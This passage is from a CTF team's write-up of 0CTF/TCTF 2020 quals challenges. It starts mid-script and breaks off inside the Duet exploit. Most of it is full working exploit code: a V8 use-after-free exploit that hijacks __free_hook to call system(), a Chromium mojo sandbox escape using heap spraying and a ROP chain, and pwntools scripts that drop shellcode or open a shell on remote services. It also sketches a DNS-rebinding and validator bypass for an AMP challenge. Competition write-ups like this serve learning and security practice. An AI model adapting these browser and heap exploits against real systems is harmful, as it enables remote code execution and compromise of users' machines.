    r = s.post('http://pwnable.org:2333/lottery/charge', data=dict(user=uid, enc=new_enc))
    print('result', r.text)
    r = s.post('http://pwnable.org:2333/user/login', data=data).json()
    print(json.dumps(r, indent=2))
    coin = int(r['user']['coin'])

# flag{f1d6356a-4288-4a13-a28a-78da73328493}
```

Flag: `flag{f1d6356a-4288-4a13-a28a-78da73328493}`

### AMP 2020 (not solved)

The author's full writeup is [here](https://github.com/zsxsoft/my-ctf-challenges/tree/master/0ctf2020/amp2020). 


Written by [bookgin](https://raw.githubusercontent.com/balsn/ctf_writeup/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20200627-0ctf_tctf2020quals/twitter.com/bookgin_tw). My approach was a little bit different though I didn't solve this in the end.

1. Bypass AMP validator using ambiguous HTML comment `<!--> <meta http-equiv="refresh" content="0;url=http://example.com/" />`. `<noscript>` should also works.
2. Bypass axios private IP check using [IPv4-mapped IPv6](https://en.wikipedia.org/wiki/IPv6#IPv4-mapped_IPv6_addresses). `[0::ffff:172.30.1.3]`
3. DNS rebinding to bypass CORS and Same-origin policy to read flag at `http://af...:password@[0::ffff:172.30.1.3]:5984/af.../flag`

For the DNS rebinding part, because Chrome disables Basic authentication in URL, we need to use `fetch` API to add the `Authorization` header (thus limited by CORS). By leveraging DNS rebinding we can achieve this and exfiltrate the flag out.

However, as far as I know, because the database IP `172.30.1.3` is in the subnet of webserver `172.30.1.2/24`, that means Chrome (my version is Chromium 83.0.4103.106) will always resolve to this IP first, which prevent [multiple-answers](https://github.com/nccgroup/singularity) DNS rebinding from working. Round robin DNS rebinding requires more time (> 30s ?) to launch. In this challenge the admin only stays for at most 10 seconds.

One exception is that if the db server TCP port is suddenly closed, [the default failover](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/) will resolve to the other IP address. Then we can just shutdown our server to make it connect it back to exfiltrate the flag. But [@adm1nkyj1](https://twitter.com/zsxsoft/status/1277445996834721796) solved this challenge using DNS rebinding. It's very impressive.

I think I have to dig more about the failver mechanism. Maybe it's somehow related to DNS cache?


## Pwn

### Chromium RCE

Given a patched d8 binary and a diff file, the goal of this challenge is to pwn the d8 binary ( the developer shell of V8 ) . 

#### Vulnerability

We first analyze the diff file ( some lines are omitted for the sake of readability ):

```diff
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
 
     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
 
       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 117df1cc52..9c6ca7275d 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1339,9 +1339,9 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }

.........( omitted ).................

diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 3519599a88..f1ba0fb445 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);
 
     case Token::MOD:
-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
-        return ParseV8Intrinsic();
-      }
-      break;
+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+      return ParseV8Intrinsic();
 
     default:
       break;
diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
index 9577b37397..2206d250d7 100644
--- a/src/parsing/parser.cc
+++ b/src/parsing/parser.cc
@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
   const Runtime::Function* function =
       Runtime::FunctionForName(name->raw_data(), name->length());
 
+  // Only %ArrayBufferDetach allowed
+  if (function->function_id != Runtime::kArrayBufferDetach) {
+    return factory()->NewUndefinedLiteral(kNoSourcePosition);
+  }
+
   // Be more permissive when fuzzing. Intrinsics are not supported.
   if (FLAG_fuzzing) {
     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
```

To summarize what this patch does:
* The patch allow us to call `%ArrayBufferDetach` in d8, which will [detach an ArrayBuffer](https://tc39.es/ecma262/#sec-isdetachedbuffer).
* During `TypedArray.prototype.set()`, instead of ensuring the dst/src typed array being an attached typed array, the patched version of this function will always treat those typed array as an attached typed array -- which obviously isn't true since we can use `%ArrayBufferDetach` to detached a typed array's buffer.


Detaching an ArrayBuffer will cause d8 to free this buffer. If we later call `TypedArray.prototype.set()` on this buffer, **we'll be able to trigger an UAF vulnerability**. Here's a PoC that will crashes the program:

```javascript
function pwn() {
    const buffer = new ArrayBuffer(8);
    const buffer2 = new ArrayBuffer(8);
    const uint8 = new Uint8Array(buffer);
    const uint82 = new Uint8Array(buffer2);

    // Copy the values into the array starting at index 3
    uint82.set([1, 2, 3], 3); 
    uint8.set([4, 5, 6], 3); 
    console.log(uint8);

    %ArrayBufferDetach(buffer); // free buffer
    uint8.set(uint82,0); // copy uint82's content to uint8

    console.log(uint8); // crash
}

pwn();
```

The reason why the program crash is because after freeing the buffer, `uint8`'s ArrayBuffer was freed and the chunk was putted into tcache 0x20. `uint8.set(uint82,0);` will then overwrite ( corrupting ) tcache 0x20's fd pointer. Finally `console.log(uint8);` will tried to allocate chunk from tcache 0x20, crashing the program.

#### Exploitation

For address leaking, we found that by freeing a size 0x500 ArrayBuffer, we'll be able to get both heap and libc address:

```javascript
const buffer = new ArrayBuffer(0x500);
const buffer2 = new ArrayBuffer(0x500);
const uint8 = new Uint8Array(buffer);
const uint82 = new Uint8Array(buffer2);
const float64 = new Float64Array(buffer2);
%ArrayBufferDetach(buffer); //free
uint82.set(uint8,0); // copy uint8 to uint82
// float64 uses the same buffer as uint82 (buffer2)
heap =  ftoi(float64[0]);
libc = ftoi(float64[1]) - 0x3ebca0n;
console.log("Heap: 0x"+ heap.toString(16));
console.log("Libc: 0x"+libc.toString(16));
```

As for hijacking the control flow, we chose to use the fastbin attack and overwrite `__free_hook` to system, then achieve RCE by freeing an arbitrary string buffer. The whole process can be summarized into the following steps:

* Use UAF to corrupt tcache 0x40's fd pointer, overwrite it into `__free_hook-0x30` ( near `__free_hook` ).
* Allocate some 0x40 chunk to let `0x7f` be written in front of `__free_hook` ( faking heap meta data for fastbin 0x70 ).
* Launch fastbin attack. First overwrite fastbin 0x70's fd into our fake chunk ( near `__free_hook` ), then allocate chunk from fastbin 0x70.
* Now we can overwrite `__free_hook`. Overwrite it to `system`, create another ArrayBuffer for our command string, then free it with `%ArrayBufferDetach`.


Full exploit code:

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function pwn() {
    const buffer = new ArrayBuffer(0x500);
    const buffer2 = new ArrayBuffer(0x500);
    const uint8 = new Uint8Array(buffer);
    const uint82 = new Uint8Array(buffer2);
    const float64 = new Float64Array(buffer2);
    
    // Free a chunk and leak heap and libc address
    %ArrayBufferDetach(buffer);
    uint82.set(uint8,0);
    heap =  ftoi(float64[0]);
    libc = ftoi(float64[1]) - 0x3ebca0n;
    console.log("Heap: 0x"+ heap.toString(16));
    console.log("Libc: 0x"+libc.toString(16));
  
    // Poison tcache 0x40's fd to near __free_hook
    // Ensure 0x7f is placed before __free_hook for later usage ( fastbin attack )
    const buffer3 = new ArrayBuffer(0x30);
    const uint83 = new Uint8Array(buffer3);
    %ArrayBufferDetach(buffer3);
    float64[0] = itof(libc+0x3ed8e8n-0x30n); // free_hook - 0x30
    uint83.set(uint82.slice(0,8),0);
    for(let i=0;i<20;i++)
        new ArrayBuffer(0x30);
    
    // Fastbin attack 
    // Get an ArrayBuffer, which its buffer address is near __free_hook
    const buffer4 = new ArrayBuffer(0x8);
    const uint84 = new Uint8Array(buffer4);
    float64[0] = itof(libc+0x3ed8cdn); // overwrite fastbin 0x70's fd
    uint84.set(uint82.slice(0,8),0);
    var X = []
    
    for(let i=0;i<0x10;i++)
        X.push(new Uint8Array(new ArrayBuffer(0x60)));
    
    for(let i=0;i<0x10;i++)
        %ArrayBufferDetach(X[i].buffer);
    
    X[0xf].set(uint84,0);
    new ArrayBuffer(0x60);
    const uint87 = new Uint8Array(new ArrayBuffer(0x60)); // get the buffer !
 
    // We now get the ArrayBuffer which its buffer address is near __free_hook
    // Overwrite __free_hook to system
    const RIP = libc+0x4f440n; // system
    float64[0] = itof(RIP);
    for(let i=0;i<0x8;i++)
        uint87[i+0x13-8] = uint82[i];

    // Construt the CMD in another ArrayBuffer
    var CMD = "/readflag";
    var cmd = new Uint8Array(new ArrayBuffer(0x80));
    for(let i=0;i<CMD.length;i++) {
        cmd[i] = CMD.charCodeAt(i);
    }
  
    // Free the ArrayBuffer will call system(CMD);
    %ArrayBufferDetach(cmd.buffer);  
}
pwn();
```

flag: `flag{dbc68439ba5f2cdbccf459cd3edb54c80b9c89e9}`

### Chromium SBX

This time we were ask to pwn a patched Chromium binary. The environment settings of this challenge is pretty similar to the [mojo challenge](https://ctftime.org/task/11314) in this year's Plaid CTF. The author added some vulnerable mojo interfaces in Chromium and we'll have to exploit the vulnerability in order to get the flag of this challenge.

> We're not familiar with Chrome's mojo, so lots of concept/terminology might be wrong, but here's how we solve the challenge:


#### Vulnerability
By looking at the diff file we know that the challenge added two mojo interfaces in the browser:

```
module blink.mojom;

interface TStorage {
    Init() => ();
    CreateInstance() => (pending_remote<blink.mojom.TInstance> instance);
    GetLibcAddress() => (uint64 addr);
    GetTextAddress() => (uint64 addr);
};

interface TInstance {
    Push(uint64 value) => ();
    Pop() => (uint64 value);
    Set(uint64 index, uint64 value) => ();
    Get(uint64 index) => (uint64 value);
    SetInt(int64 value) => ();
    GetInt() => (int64 value);
    SetDouble(double value) => ();
    GetDouble() => (double value);
    GetTotalSize() => (int64 size);
};
```

* `TInstance` is an mojo interface which allow us to perform some operations including:
    * Push / Pop a `uint64` value to a queue
    * Get/Set a `uint64` value in an inlined array
    * Get/Set a `uint64`/`double` value
    * Get the total size of the queue and inlined array.
        * **This is done by calling a virtual method ( important )**
* `TStorage` in another mojo interface, which contains two friendly functions: `GetLibcAddress()` and `GetTextAddress()`, making us able to leak the libc & text address directly. Also it holds an instance of a `TInstance` interface.

By using the following javascript snippet we're able to interact with the mojo interface:

```javascript
// include the mojo js binding first

// Create TStorage
tsptr = new blink.mojom.TStoragePtr();
Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tsptr).handle);
await tsptr.init();

// Create TInstance
tiptr = (await tsptr.createInstance()).instance;

// Operations
await tiptr.push(0); // push
let v = (await tiptr.pop()).value; // pop
let sz = (await tiptr.getTotalSize()).size; // getTotalSize
```

We then spent some time playing around with  interfaces / code reviewing the diff file...etc. At last we notice something at line 324:

```cpp=322
void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
    mojo::PendingRemote<blink::mojom::TInstance> instance;
    mojo::MakeSelfOwnedReceiver(std::make_unique<content::TInstanceImpl>(inner_db_.get()),
                                instance.InitWithNewPipeAndPassReceiver());

    std::move(callback).Run(std::move(instance));
}
```

At line 324, it uses `innder_db_.get()` to pass the `InnerDbImpl*` pointer into `TInstanceImpl`'s constructor:

```cpp
TInstanceImpl::TInstanceImpl(InnerDbImpl* inner_db) : weak_factory_(this) {
    inner_db_ptr_ = inner_db;
}
```

According to the reference in [cplusplus.com](http://www.cplusplus.com/reference/memory/unique_ptr/get/):

> Notice that a call to this function does not make unique_ptr release ownership of the pointer (i.e., it is still responsible for deleting the managed data at some point). Therefore, the value returned by this function shall not be used to construct a new managed pointer.

This means that `TStorageImpl->inner_db_` will be equal to `TInstanceImpl->inner_db_ptr_`. Since both of the pointer point to the same memory, **freeing one of them will cause another one to become a dangling pointer.** We then test our theory with the following PoC:

```javascript
// After we create TStorage and TInstance
 
await tsptr.ptr.reset(); // Free TStorage, this will cause TStorageImpl->inner_db_ to be freed
await tiptr.getTotalSize(); // Chromium will crash
```

The code above will crash Chromium. This is because `tsptr.ptr.reset()` will free `inner_db_ptr_`, and `tiptr.getTotalSize()` will call `inner_db_ptr_->GetTotalSize();` ( a virtual method ). Since `inner_db_ptr_` is now a dangling pointer, the vtable is now corrupted, causing the program jump to an invalid address, thus crashing the program.

#### Exploitation

Our plan is simple. Since now `inner_db_ptr_` is a dangling pointer, we'll tried to reclaim its memory buffer ( e.g. heap spraying ) and overwrite the structure of `inner_db_ptr_`. If we can control the vtable, we'll be able to jump to an arbitrary address by calling `tiptr.getTotalSize()`.

However it's not easy to reclaim its memory buffer. We're not familiar with PartitionAlloc so all we did is trial and error: 

* Free lots of chunk
* Re-allocate lots of chunk
* See if we have successfully reclaim the memory by scanning a string with special pattern, which was sprayed in the heap during the re-allocation phase.

After spending lots of time spraying the heap we finally managed to reclaim the memory and was able to control the structure of `inner_db_ptr_`. This means that we're able to control not only the vtable, but also the data pointer of `inner_db_ptr_->queue_`. By controlling the queue's data pointer, **we'll be able to achieve arbitrary read/write by doing `pop/push`**.

So here's our exploit plan:
* Leak libc and text address.
* Trigger the UAF vulnerability, let `inner_db_ptr_` become a dangling pointer.
* Spray the heap so we can reclaim the memory buffer of `inner_db_ptr_`. Now we control the vtable and the queue's data pointer.
* Use arbitrary write to write ROP chain to the bss section of the Chromium binary.
* Control vtable and let it point to gadget `xchg rax, rsp ; ret`.
    * Since `rax` is controllable, we'll pivot our stack to bss section and jump to our ROP chain.
* Finally, hijack control flow by calling `getTotalSize()`.

Here's our final exploit, some details can be found in the code comment:

```html
<html>
    <pre id='log'></pre>
    <script src="../mojo_bindings.js"></script>
    <script src="../third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
    <script>
        function print(string) {
            var log = document.getElementById('log');
            if (log) {
                log.innerText += string + '\n';
            }
        }
        function hex(data) {
            return "0x"+data.toString(16);
        }

        (async function pwn() {
            print("Creating TStoragePtr...");
            tsptr = new blink.mojom.TStoragePtr();
            Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tsptr).handle);
            await tsptr.init();
            A = [];
            B = [];
            C = [];
            
            // B[i] will create lots of TInstance, and push it to A[i]
            // B[i]'s TStorage will correspond to A[i]
            for(let i=0;i<0x100;i++){
                B.push(null);
                B[i] = new blink.mojom.TStoragePtr();
                Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(B[i]).handle);
                await B[i].init();

                function tiptrOK2(result) {
                    A.push(result.instance);
                }
                await B[i].createInstance().then(tiptrOK2, ERROR);
            }
	    
            // C[i] stores TInstance
            // Later we'll use C[i].push(value) to spray the heap
            for(let i=0;i<0x100;i++){
                let tsptr2 = new blink.mojom.TStoragePtr();
                Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tsptr2).handle);
                await tsptr2.init();

                function tiptrOK2(result) {
                    C.push(result.instance);
                }
                await tsptr2.createInstance().then(tiptrOK2, ERROR);
            }

            // Triggering UAF
            // Now every inner_db_ptr_ in A[i] are all dangling pointers
            for(let i=0;i<0x100;i++){
                await B[i].ptr.reset();
            }

            var libc = null;
            var text = null;
            // callback for getLibcAddress
            function libcOK(result) {
                libc = result.addr;
            }
            function ERROR(error) {
                print(error.toString());
            }
            // callback for getTextAddress
            function textOK(result) {
                text = result.addr;
            }

            // get libc & text address
            await tsptr.getLibcAddress().then(libcOK, ERROR);
            print("libc: "+hex(libc));
            await tsptr.getTextAddress().then(textOK, ERROR);
            print("text: "+hex(text));

            // create TInstance ( tiptr )
            var tiptr = null;
            function tiptrOK(result) {
                tiptr = result.instance;
            }    
            await tsptr.createInstance().then(tiptrOK, ERROR);
	    
            bss = text+0x6ec71a0-0x200; // For storing ROP chain
            cmd_buf = bss - 0x100; // For storing command string
            print("bss: "+hex(bss));
            
            // Start spraying heap
            for(let idx=0;idx<0x40;idx++){
                for(let i = 0 ; i< 0x600/64 ; i++) {
                    await C[idx].push(bss); // fake vtable entry
                    await C[idx].push(bss); // arbitrary write will write to this address
                    await C[idx].push(0x414141414141);
                    await C[idx].push(0x9abc);
                    await C[idx].push(0x0);
                    await C[idx].push(0x5678);
                    await C[idx].push(0xdead);
                    await C[idx].push(0xbeef);
                }
            }
            // ROP gadget in chrome
            base = text - 0x39b5e60;
            xchg_rax_rsp = base + 0x0000000007fde8e4;
            pop3 = base + 0x00000000068589a5;
            pop_rdi = base + 0x0000000002e9ee1d;
            pop_rax = base + 0x0000000002d815fc;
            ret = pop_rax+1;
            mov_al_rdi_pop = base + 0x527c945;

            // libc
            libc_base = libc - 0x40680;
            system = libc_base + 0x4f440;
            
            cmd = "./flag_printer\x00";

            for(let idx=0;idx<0x100;idx++){
                // scanning string with special-pattern
                let res = await A[idx].getInt(); 
                let v = res.value;
                if( v == 0x5678){
                    // write ROP chain to bss
                    await A[idx].push(pop3);
                    await A[idx].push(0x434343434343);
                    await A[idx].push(xchg_rax_rsp); // vtable will jump to here 
                    await A[idx].push(0x111111111111);
                    // Create ROP chain for copying cmd string to bss ( cmd_buf )
                    for (let cmd_idx = 0; cmd_idx < cmd.length ; cmd_idx++) {
                        await A[idx].push(pop_rdi);
                        await A[idx].push(cmd_buf + cmd_idx);
                        await A[idx].push(pop_rax);
                        await A[idx].push(cmd.charCodeAt(cmd_idx));
                        await A[idx].push(mov_al_rdi_pop);
                        await A[idx].push(0xdeadbeef); // for rbp
                    }
                    // Final ROP. system(cmd_buf)
                    await A[idx].push(pop_rdi);
                    await A[idx].push(cmd_buf);
                    await A[idx].push(system);
                    // trigger virtual function
                    await A[idx].getTotalSize(); // will call [bss+0x10]
                    break;
                }	

            }
          
            print("Done.");
        })();
    </script>

</html>
```

The exploit will execute `system("./flag_printer")` and gave us the flag: `flag{029fd0ab84ea6e42a64d13b6150e1}`




### simple echoserver

* Fmt string change rbp chain can overwrite stack.
* Use fmt string %*d to print the count of the lower 4 bytes of main_ret address.
* Change main_ret to one_gadget ,then get the shell.
* need a stack lsb bruteforce & (main_ret_address & 0xffffffff) < 0x80000000 (1/32)

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwnable.org'
port = 12020

binary = "./simple_echoserver"
context.binary = binary
elf = ELF(binary)

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil("name: ")
  r.sendline("%c"*17 + "%" + str(0x48-17-13) + "c%hhn" + "%c"*27 + "%" + str(0x4f322 - 0x21b97-27-0x48) + "c%*d" + "%39$n")
  r.recvuntil(": ")
  r.sendline("A")
  print("fuuuckkkkk")
  r.recvuntil("ourself!\n")
  r.sendline("~.")
  try:
    r.sendline("echo AAAA")
    r.recvuntil("AAAA")
  except:
    r.close()
    exit()
  print("shellllll")
  r.sendline("ls")
  r.sendline("ls /home")
  r.sendline("ls /home/*")
  r.sendline("cat /flag")
  r.sendline("cat /f*")
  r.sendline("cat /home/*/flag")
  r.sendline("cat /home/*/f*")

  r.interactive()

```
`flag{do_you_like_my_simple_echoserver_f1b960576af79d28}`

### eeeeeemoji
* The challenge input 🍺 will use mmap to randomly generate space with rwx permissions.
* Input 🐴, we can control mmap+0 ~ mmap+0x100 bytes, and mmap+0x200 2 bytes, then execute mmap+0x200 address.

Execute shellcode registers status
```
RAX: 0xdeadbeefdeadbeef
RBX: 0xdeadbeefdeadbeef
RCX: 0xdeadbeefdeadbeef
RDX: 0x238200 --> 0x9090909090900041
RSI: 0xdeadbeefdeadbeef
RDI: 0xdeadbeefdeadbeef
RBP: 0xdeadbeefdeadbeef
RSP: 0x7fffffff6160 ('A' <repeats 200 times>...)
RIP: 0x238200 --> 0x9090909090900041
R8 : 0xdeadbeefdeadbeef
R9 : 0xdeadbeefdeadbeef
R10: 0xdeadbeefdeadbeef
R11: 0xdeadbeefdeadbeef
R12: 0xdeadbeefdeadbeef
R13: 0xdeadbeefdeadbeef
R14: 0xdeadbeefdeadbeef
R15: 0xdeadbeefdeadbeef
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```

* 2-byte Shellcode setting "and esp, edx".

0x7fffffff6160 & 0x238200 = 0x230000 
mmap+0x230 code = add rsp,0x8000
add 0x230000,0x8000 = 0x238000
* Probability changes rsp to mmap-0x8000, and controls the register to execute mmap+0 ~ mmap+0x100 shellcode to get the shell.

```python3=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwnable.org'
port = 31323

binary = "./eeeeeemoji"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)


def convert(data,src='utf8'):
    if src=='utf8':
        L = len(data)
        cursor = 0
        res = b''
        while cursor<L:
            binstr = '0'
            firstbyte = data[cursor]
            batchsize = 0
            for i in range(8):
                if firstbyte&(1<<(7-i))==0:
                    batchsize = i
                    break
            if batchsize>6:
                print('error')
                exit()
            binstr+=bin(data[cursor])[2:].rjust(8,'0')[batchsize+1:]
            for i in range(1,batchsize):
                binstr+=bin(data[cursor+i])[2:].rjust(8,'0')[2:]
            num = int(binstr,2)
            res+=p32(num)
            cursor+=batchsize
            if batchsize==0:
                cursor+=1
        return res
    elif src=='wchar':
        L = len(data)
        res = b''
        if L%4!=0:
            L+=4-L%4
            data = data.ljust(L,b'\x00')
        print(data)
        for i in range(0,L,4):
            num = u32(data[i:i+4])
            print(hex(num))
            if num<0x80:
                res+=p8(num)
            elif num<0x800:
                binstr = bin(num)[2:].rjust(11,'0')
                res+=p8(0xc0|int(binstr[:5],2))+p8(0x80|int(binstr[5:],2))
            elif num<0x10000:
                binstr = bin(num)[2:].rjust(16,'0')
                res+=p8(0xe0|int(binstr[:4],2))
                for j in range(2):
                    res+=p8(0x80|int(binstr[4+j*6:4+j*6+6],2))
            elif num<0x200000:
                binstr = bin(num)[2:].rjust(21,'0')
                res+=p8(0xf0|int(binstr[:3],2))
                for j in range(3):
                    res+=p8(0x80|int(binstr[3+j*6:3+j*6+6],2))
            elif num<0x4000000:
                binstr = bin(num)[2:].rjust(26,'0')
                res+=p8(0xf8|int(binstr[:2],2))
                for j in range(4):
                    res+=p8(0x80|int(binstr[2+j*6:2+j*6+6],2))
            elif num<0x80000000:
                binstr = bin(num)[2:].rjust(31,'0')
                res+=p8(0xfc|int(binstr[:1],2))
                for j in range(5):
                    res+=p8(0x80|int(binstr[1+j*6:1+j*6+6],2))
            else:
                binstr = bin(num)[2:].rjust(36,'0')
                res+=p8(0xfe)
                for j in range(6):
                    res+=p8(0x80|int(binstr[j*6:j*6+6],2))
        return res


if __name__ == '__main__':
  print(r.recvline())
  print(r.recvline())
  print(r.recvline())
  print(r.recvline())

  while 1:
    r.sendline("🍺"))
    print(r.recvline())
    r.recvuntil("@")
    data = r.recvline()
    mmap = int(data[:-1].decode(),16)
    print("mmap = {}".format(hex(mmap)))
    if(mmap & 0x8000):
      break
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
  print(r.recvline())
  print(r.recvline())
  print(r.recvline())
  r.sendline("🐴"))
  print(r.recvline())
  shellcode = convert(asm("xor eax,eax") + asm("add al,0"),"wchar")
  shellcode += convert(asm("xor edi,edi") + asm("add al,0"),"wchar")
  shellcode += convert(asm("xor edx,edx") + asm("add al,0"),"wchar")
  shellcode += convert(asm("add dh,cl") + asm("add al,0"),"wchar")
  shellcode += convert(asm("syscall") + asm("add al,0"),"wchar")
  r.sendline((convert(p32(mmap+0x88),"wchar") + convert(p32(0),"wchar"))*0x11 + convert(p32(mmap+0x90),"wchar") + convert(p32(0),"wchar")  + shellcode  +convert(p32(0x7fffffff),"wchar")*0x57 + convert(p32(0xd421),"wchar")*10)

  r.sendline(b"\x90"*0x50 + asm(shellcraft.sh()))
  time.sleep(0.3)
  r.sendline(b"ls")
  r.interactive()


```

`flag{thanks_Plaid_CTF_we_found_th1s}`

### Duet

* Option 5 can calloc 0x88 and input 1 byte overflow.
* Heap overlap will leak libc & heap.
* Largebin attack global_max_fast.
* Fastbin attack stdout to get stdout buffer (stdout flag is 0x000000fbxxxxxx, so 0x000000fb can use to be fastbin size).
* Change puts stdout vtable to _IO_wfile_sync, and contorl rip & rdi.
* Jump magic and setcontext to call mprotect, and finally execute shellcode.

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwnable.org'
port = 12356

binary = "./duet"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new(index,data):
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(index)
  r.recvuntil(": ")
  r.sendline(str(len(data)))
  r.recvuntil(": ")
  r.send(data)
  pass


def remove(index):
  r.recvuntil(": ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(index)
  pass

def show(index):
  r.recvuntil(": ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(index)

def heap(b):
  r.recvuntil(": ")
  r.sendline("5")
  r.recvuntil(": ")
  r.sendline(str(b))

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  fuck = {0: "琴",1:"瑟"}
  for i in xrange(7):
    new(fuck[0],"A"*0x80)
    remove(fuck[0])
    new(fuck[0],"A"*0xe0)
    remove(fuck[0])
    new(fuck[0],"A"*0xf0)
    remove(fuck[0])
    new(fuck[0],"A"*0x1e0)
    remove(fuck[0])
    new(fuck[0],"A"*0x140)
    remove(fuck[0])
    print i
  new(fuck[0],"A"*0x88)
  new(fuck[1],"A"*0xf0)
  remove(fuck[0])
  heap(0xf1)
  new(fuck[0],p64(0x81)*60)
  remove(fuck[1])
  new(fuck[1],p64(0x21)*96)
  remove(fuck[1])
  new(fuck[1],p64(0x91)*31 + p64(0x91) + "D"*0x88 + p64(0x21)*11)
  remove(fuck[0])
  show(fuck[1])
  r.recv(0x105)
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x1e4ca0
  print("libc = {}".format(hex(libc)))
  new(fuck[0],p64(0x21)*60)
  remove(fuck[0])
  remove(fuck[1])

  new(fuck[0],p64(0x21)*128)
  remove(fuck[0])
  for i in xrange(6):
    new(fuck[0],"A"*0x400)
    remove(fuck[0])
    print i
  new(fuck[0],"A"*0x400)
  new(fuck[1],"A"*0x200)
  remove(fuck[0])
  remove(fuck[1])
  new(fuck[0],"A"*0x80)


  new(fuck[1],p64(0x91)*31 + p64(0x421) + "D"*0x88 + p64(0x21)*11)
  remove(fuck[0])
  show(fuck[1])
  r.recv(0x10d-8)
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0x4d90
  print("heap = {}".format(hex(heap)))
  global_max_fast = 0x1e7600 + libc
  remove(fuck[1])
  new(fuck[1],"A"*0x90)
  remove(fuck[1])
  new(fuck[0],"A"*0x400)
  new(fuck[1],"A"*0x58 + p64(0x421) + p64(global_max_fast-0x20)*2 + p64(global_max_fast-0x20)*2 + "A"*0xc0)
  remove(fuck[0])

  print("libc = {}".format(hex(libc)))

  _IO_wfile_sync = libc + 0x1e5fc0
  magic = libc + 0x000000000012be97 # mov    rdx,QWORD PTR [rdi+0x8] ; mov    rax,QWORD PTR [rdi] ; mov    rdi,rdx ; jmp    rax

  print("_IO_wfile_sync = {}".format(hex(_IO_wfile_sync)))
  payload = "Z"*0x30
  setcontext = 0x55e35 + libc
  payload += p64(setcontext) + p64(heap + 0x4df0)+"E"*0x10 + p64(magic)
  payload += cyclic(96) + p64(heap) + p64(0x21000) + p64(0)*2 + p64(7)*3 + p64(heap+0x4ea0)
  payload += p64(libc + 0x117590) + p64(heap+0x4ea8)
  payload += (asm(shellcraft.open("/flag")) +
              asm(shellcraft.read("rax",heap+0x100,0x100)) +
              asm(shellcraft.write(1,heap+0x100,"rax")) + "\xeb\xfe")
  payload = payload.ljust(0x3f0,"F")

  new(fuck[0],payload) # large bin attack success

  remove(fuck[1])
  new(fuck[1],"C"*0x58 + p64(0x421) + p64(libc + 0x1e5090)*2 + p64(heap+0x2c20)*2 + p64(0x21)*24) # fix large bin
  remove(fuck[1])
  remove(fuck[0])
  new(fuck[0],"A"*0x98)
  new(fuck[1],"D"*0x58 + p64(0xf1) + "D"*0xe0)
  remove(fuck[0])
  remove(fuck[1])
  new(fuck[1],"D"*0x58 + p64(0xf1) + p64(libc + 0x1e575b) + "D"*0xe0)
